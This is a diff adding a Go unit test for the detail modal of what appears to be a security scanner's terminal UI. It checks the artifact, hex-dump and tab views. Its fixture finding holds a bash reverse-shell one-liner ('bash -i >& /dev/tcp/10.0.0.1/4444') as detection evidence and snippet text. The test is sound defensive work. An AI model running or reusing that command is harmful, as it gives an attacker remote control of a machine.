@@ -498,3 +498,65 @@ func TestFlightDeckDashboard_WideAndCompact(t *testing.T) {
 		t.Errorf("expected compact view to contain horizontal Active Modules row, got: %s", compactView)
 	}
 }
+
+func TestRenderDetailModal_HexAndSnippetTabs(t *testing.T) {
+	th := theme.NewTheme(true)
+	finding := report.Finding{
+		Severity: report.SeverityAlert,
+		Title:    "Reverse Shell Attack",
+		RuleName: "Script_Reverse_Shell_Interactive",
+		Path:     "/tmp/rev.sh",
+		Reason:   "interactive bash reverse shell detected",
+		Evidence: "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
+		Snippet: &report.SnippetContext{
+			Lines: []report.SnippetLine{
+				{Number: 1, Text: "#!/bin/bash", IsMatch: false},
+				{Number: 2, Text: "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1", IsMatch: true},
+			},
+			MatchIndex: 1,
+		},
+		Hashes: map[string]string{
+			"SHA256": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
+		},
+	}
+
+	m := Model{
+		theme:         th,
+		findings:      []report.Finding{finding},
+		visible:       []report.Finding{finding},
+		selectedIndex: 0,
+		state:         stateDetail,
+		width:         120,
+		height:        35,
+	}
+
+	// 1. Tab 1: Artifact & Context Snippet
+	m.activeTab = 1
+	viewArtifact := m.renderDetailModal()
+	if !strings.Contains(viewArtifact, "SOURCE CODE CONTEXT & MATCH LINE") {
+		t.Errorf("expected Artifact tab to display source code context, got: %s", viewArtifact)
+	}
+	if !strings.Contains(viewArtifact, "#!/bin/bash") || !strings.Contains(viewArtifact, "bash -i >&") {
+		t.Errorf("expected context lines in Artifact tab, got: %s", viewArtifact)
+	}
+
+	// 2. Tab 2: Hex & Byte Inspector
+	m.activeTab = 2
+	viewHex := m.renderDetailModal()
+	if !strings.Contains(viewHex, "RAW FORENSIC PAYLOAD BYTE DUMP") {
+		t.Errorf("expected Hex tab to display raw forensic byte dump header, got: %s", viewHex)
+	}
+	if !strings.Contains(viewHex, "OFFSET") || !strings.Contains(viewHex, "ASCII DECODE") {
+		t.Errorf("expected Hex tab to display hexdump table, got: %s", viewHex)
+	}
+	if !strings.Contains(viewHex, "00000000") {
+		t.Errorf("expected offset 00000000 in hexdump, got: %s", viewHex)
+	}
+
+	// 3. Tab navigation bar shows all 5 tabs
+	if !strings.Contains(viewHex, "[1] Assessment") || !strings.Contains(viewHex, "[2] Artifact") ||
+		!strings.Contains(viewHex, "[3] Hex Inspector") || !strings.Contains(viewHex, "[4] MITRE ATT&CK") ||
+		!strings.Contains(viewHex, "[5] Remediation") {
+		t.Errorf("expected all 5 tabs in detail modal header, got: %s", viewHex)
+	}
+}
